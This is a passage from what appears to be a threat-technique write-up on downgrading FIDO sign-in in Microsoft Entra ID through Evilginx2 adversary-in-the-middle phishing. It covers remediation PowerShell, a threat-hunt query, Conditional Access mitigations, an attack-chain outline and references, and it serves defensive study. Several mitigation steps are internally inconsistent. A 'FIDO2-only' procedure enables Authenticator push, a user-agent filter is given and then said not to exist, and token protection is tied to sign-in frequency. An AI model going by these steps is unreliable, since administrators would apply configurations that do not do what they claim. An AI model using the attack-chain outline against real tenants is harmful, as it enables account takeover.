   Update-MgUser -UserId "victim@company.onmicrosoft.com" -PasswordProfile @{ForceChangePasswordNextSignIn=$true; Password=$newPassword}
   
   # Re-register MFA
   Remove-MgUserAuthenticationMethod -UserId "victim@company.onmicrosoft.com" -AuthenticationMethodId "<compromised_method_id>"
   
   # Re-enable user after remediation
   Update-MgUser -UserId "victim@company.onmicrosoft.com" -AccountEnabled $true
   ```

4. **Threat Hunt:**
   ```kusto
   // Check for other compromised accounts using same phishing domain or attacker IP
   SigninLogs
   | where ipAddress == "<attacker_ip>"
   | where createdDateTime > ago(7d)
   | distinct userId, userPrincipalName, ipAddress, createdDateTime
   ```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce FIDO2-Only Authentication for High-Value Users**

Disable all fallback MFA methods for privileged accounts (global admins, security admins, Exchange admins).

**Applies To:** All Entra ID versions

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
2. Click **Microsoft Authenticator**
3. Under **Enable**, select **Yes** for **Allow push notifications**
4. Under **Available to**, select **All users** (or specific groups)
5. **CRITICAL:** Under **Enforce registration on sign-in**, select **Yes**
6. Under **Registration campaign**, enable this policy
7. Go back to **Authentication methods** → select each of: **SMS**, **Phone call**, **OATH**
8. Set **Enable**: **No** (disable SMS, phone call for privileged users)
9. Click **Save**

**Privileged User Exclusion:**
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Enforce FIDO2 Only for Admins`
4. **Assignments:**
   - Users: Select **Global Administrators**, **Security Administrators**
   - Cloud apps: **All cloud apps**
5. **Conditions:**
   - Sign-in risk: **High**
6. **Access controls:**
   - Grant: **Require compliant device**
   - Require multi-factor authentication: **Yes (FIDO2 only)**
7. Enable policy: **On**
8. Click **Create**

**Validation Command:**
```powershell
# Check if user is excluded from SMS-based MFA
$user = Get-MgUser -UserId "admin@company.onmicrosoft.com"
$authMethods = Get-MgUserAuthenticationMethod -UserId $user.Id
$authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "phone" }
# Should return EMPTY if mitigation is successful
```

**2. Implement Conditional Access to Block Unsupported Browser/OS Combinations**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Block Safari on Windows`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
5. **Conditions:**
   - Add condition: **Device platforms**
   - **Include**: Windows
6. **Add filter for user agents:**
   - Device filter: **Operator: Equals** → **Filter: browserType** → **Value: Safari**
7. **Access controls:**
   - Grant: **Block access**
8. Enable policy: **On**
9. Click **Create**

**Note:** Conditional Access does NOT support native User-Agent filtering; requires custom policy or WAF rules.

**Alternative: Use Azure Front Door / API Management to filter requests:**
```yaml
- Name: Block Safari on Windows
  Rule:
    Match:
      - Variable: RequestHeader User-Agent
        Operator: Contains
        Value: Safari/605
      - Variable: RequestHeader User-Agent
        Operator: Contains
        Value: Windows
    Action: Block
```

**3. Require Device Compliance for All Authentication Attempts**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Require Compliant Device`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps** (including Office 365, Teams, Exchange)
5. **Conditions:**
   - Locations: **All locations** (or exclude corporate network only)
6. **Access controls:**
   - Grant: **Require device to be marked as compliant** AND **Require Hybrid Azure AD joined device**
7. Enable policy: **On**
8. Click **Create**

**Impact:** Users on unmanaged/personal devices cannot authenticate, even with valid credentials and MFA. This blocks AiTM attacks from attacker's personal device.

**Validation Command:**
```powershell
# Check if device compliance is enforced
$policies = Get-MgIdentityConditionalAccessPolicy
$policies | Where-Object { $_.DisplayName -match "Compliant" } | Select-Object DisplayName, GrantControls
```

### Priority 2: HIGH

**4. Enforce Token Protection in Conditional Access (Preview)**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Enforce Token Protection`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
5. **Session controls:**
   - Enable session control: **Yes**
   - Token protection: **Sign-in frequency** → Enable
6. Enable policy: **On**
7. Click **Create**

**Note:** As of 2025-01, Token Protection only applies to token issuance, not session cookie validation. Limited effectiveness against AiTM.

**5. Monitor and Alert on MFA Enrollment Changes**

**Manual Steps (Azure Portal - Configure Alert):**
1. Go to **Azure Portal** → **Microsoft Sentinel**
2. Create alert rule (see Section 7, Query 1)
3. **Alert on:** New MFA method registration, MFA removal, authentication method changes
4. Set **Alert Threshold:** Any change = immediate alert
5. Configure **Action:** Send to SOC for immediate investigation

**6. User Awareness Training**

Implement mandatory training covering:
- How to identify phishing emails (sender domain verification, URL inspection)
- What FIDO authentication looks like (biometric/security key prompts, no password)
- What to do if authentication method changes unexpectedly
- **Golden rule:** If MFA method suddenly changes (password → SMS, Authenticator → phone), **STOP and call IT support**

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [REALWORLD-010] Safari Device Spoof | Attacker crafts Evilginx2 phishlet with Safari on Windows User-Agent |
| **2** | **Social Engineering** | Phishing email delivery | Target receives urgent-sounding email with phishing link |
| **3** | **Credential Access** | [REALWORLD-011] FIDO Unsupported Error | User-Agent causes Entra ID to disable FIDO and present error |
| **4** | **MFA Downgrade** | **[REALWORLD-009]** | User forced to use weaker MFA (SMS/Authenticator) instead of FIDO |
| **5** | **Man-in-the-Middle** | [REALWORLD-012] MFA Downgrade via AiTM + T1557 | AiTM proxy intercepts credentials, MFA codes, and session cookie |
| **6** | **Session Hijacking** | T1528 - Steal Session Cookie | Attacker imports stolen cookie into their browser |
| **7** | **Persistence** | T1098.005 - Register MFA Device | Attacker registers new MFA device (phone, security key) under victim's account |
| **8** | **Lateral Movement** | T1534 - Spearphishing Campaign | Attacker sends internal emails from victim's account to compromise other users |
| **9** | **Impact** | T1020 - Automated Exfiltration / T1486 Ransomware | Data theft or encryption |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Proofpoint FIDO Downgrade Research (2025)

- **Target:** Microsoft Entra ID users with registered FIDO2 passkeys
- **Timeline:** Discovered August 2025; proof-of-concept released publicly
- **Technique Status:** ACTIVE - No patch available; requires administrative policy changes
- **Impact:** Researchers demonstrated complete account compromise including session hijacking; no detection alerts triggered in default Entra ID configuration
- **Reference:** [Proofpoint Research](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade), [BleepingComputer](https://www.bleepingcomputer.com/news/security/new-downgrade-attack-can-bypass-fido-auth-in-microsoft-entra-id/)

#### Example 2: Evilginx2 in the Wild - SocGolish Campaign (2024-2025)

- **Target:** Enterprise users across finance, government, technology sectors
- **Timeline:** Ongoing since 2023; accelerated adoption after FIDO downgrade discovered
- **Technique Status:** ACTIVE - APT groups actively weaponizing Evilginx2 with custom phishlets
- **Impact:** Hundreds of organizations compromised; estimated millions of dollars in damages from BEC and ransomware attacks
- **Reference:** [RedCanary Threat Report](https://redcanary.com/threat-detection-report/), [Proofpoint Quarterly Reports]

---

## References & Sources

- Proofpoint Research (2025): https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade
- Microsoft Entra ID FIDO2 Compatibility: https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility
- Evilginx2 GitHub: https://github.com/kgretzky/evilginx2
- Evilginx2 Documentation: https://help.evilginx.com
- MITRE ATT&CK T1556.006: https://attack.mitre.org/techniques/T1556/006/
- MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
- BleepingComputer (August 2025): https://www.bleepingcomputer.com/news/security/new-downgrade-attack-can-bypass-fido-auth-in-microsoft-entra-id/
- Microsoft 365 Defender AiTM Detection: https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/atp-anti-phishing

---